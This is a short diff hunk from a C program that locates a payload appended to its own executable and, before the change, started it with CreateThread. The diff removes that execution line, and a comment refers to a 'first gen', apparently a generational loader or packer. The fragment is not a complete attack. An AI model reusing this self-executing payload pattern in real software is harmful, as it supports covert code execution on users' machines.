@@ -98,8 +98,7 @@ int main(int argc, char** argv)
             
             nextPayloadBuf = myFileBuffer + i;
             NextPayloadSize = myEXESize - i;
-
-            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)(nextPayloadBuf + 8), 0, 0, 0);
+            
             break;
         }
     if (myStaticLength == 0) // This is the first gen
